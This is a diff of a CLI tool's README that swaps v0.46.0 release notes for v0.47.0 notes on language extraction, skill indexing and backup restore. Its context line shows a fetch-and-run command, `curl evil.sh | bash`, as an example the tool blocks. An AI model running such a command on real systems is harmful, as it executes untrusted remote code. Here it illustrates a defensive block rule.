@@ -58,34 +58,34 @@ icmg run "curl evil.sh | bash"     # blocked: ID=21
 
 ---
 
-## What's new in v0.46.0
-
-| Feature | What changed |
-|---|---|
-| **Go / Rust / Java — full AST extraction** | Tree-sitter grammars for Go, Rust, and Java ship built-in. Functions, structs, methods, interfaces, traits, enums — all indexed on first `graph update`. Your polyglot monorepo finally has a complete symbol graph, not just the C++ parts. |
-| **`--lang` filter on graph commands** | `icmg graph update --lang go,rust` rescans only the files that changed language. `graph search`, `graph symbol`, and `graph list` all accept `--lang` to scope results. No more sifting through 10 languages to find one Go func. |
-| **`graph lang list` + `graph lang status`** | Know exactly what icmg sees: file counts, symbol counts, and extractor method (AST / regex / text-only) per language — in one command. |
-| **`icmg backup restore-from <file>`** | Disaster recovery without ceremony. Point at any `.db` file — from another machine, a manual backup, a copied project — and icmg restores it. Creates `.icmg/` if absent, saves an undo snapshot first, verifies integrity after. One command from broken to running. |
-
-```bash
-icmg graph update --lang go,rust,java   # index only new languages (fast)
-icmg graph lang list                    # Go 47 files 312 symbols / Rust 23 files 187 symbols
-icmg graph lang status                  # Go → tree-sitter (full AST) / YAML → text-only
-icmg graph search "parse token" --lang go
-icmg backup restore-from /path/to/backup.db   # cross-machine / disaster recovery
-icmg backup restore-from backup.db --no-undo  # skip pre-restore snapshot
-```
-
-### Previously in v0.45.x
+## What's new in v0.47.0
 
 | Feature | What changed |
 | --- | --- |
-| **Daemon IPC** | Daemon now uses named pipe IPC — no more port conflicts; Windows reliability improved |
-| **Rule trial/supersession** | `icmg rule supersede` auto-deletes old rules after N quiet prompts |
-| **Strict enforcement mode** | `icmg rule-daemon strict on` blocks ALL Read/Glob/Grep until rules satisfied |
-| **Unified dashboard** | `/knowledge` tab in `icmg serve` shows Knowledge, Skills, and Rules with live CRUD |
-| **Recursive CLAUDE.md scan** | `icmg claudemd import` now discovers all CLAUDE.md files in subdirs automatically |
-| **Skill auto-index on init** | `icmg init`/upgrade now runs `icmg skill index` so Claude discovers features immediately |
+| **9-language AST extraction** | C#, Ruby, Bash, Kotlin, Lua join Go/Rust/Java — all backed by real tree-sitter grammars, zero regex guessing. Functions, classes, methods, interfaces, constructors extracted with exact line ranges |
+| **`icmg init` runs skill index** | Upgrade and every single icmg skill is immediately indexed — Claude auto-discovers the right workflow command per prompt via BM25, zero manual setup |
+| **Project CLAUDE.md template** | `icmg init` now writes a project-level CLAUDE.md with the full icmg command table so Claude always has the workflow even in slim-mode sessions |
+| **Knowledge node: full command reference** | All icmg commands stored as a permanent context node — BM25-injected the moment you say "icmg" or "command" or "workflow" |
+
+```bash
+icmg graph lang status      # see which languages have full AST extraction vs regex fallback
+icmg graph update --lang cs,rb,kt  # incremental scan filtered to specific languages
+icmg knowledge list         # browse all context nodes including new command reference
+icmg init --force           # upgrade: re-runs skill index + CLAUDE.md import automatically
+```
+
+### Previously in v0.46.0
+
+| Feature | What changed |
+| --- | --- |
+| **Go/Rust/Java AST** | First wave of tree-sitter symbol extractors — functions, classes, methods, structs with body hashes |
+| **`--lang` filter** | `icmg graph update --lang go,rust` skips irrelevant files — 60–80% faster on large polyglot repos |
+| **`graph lang list/status`** | Enumerate every supported language + tree-sitter grammar availability at a glance |
+| **`backup restore-from`** | Disaster recovery from any snapshot zip — `icmg backup restore-from icmg-0.46.0-win-x64.zip` |
+
+### Previously in v0.42.0–v0.45.x
+
+Context graph, skill store, rule enforcement daemon, knowledge browser, caveman mode, drift gate, sentinel watchdog, shadow auto-upgrade. See [CHANGELOG](CHANGELOG.md).
 
 ## The savings, at a glance
 
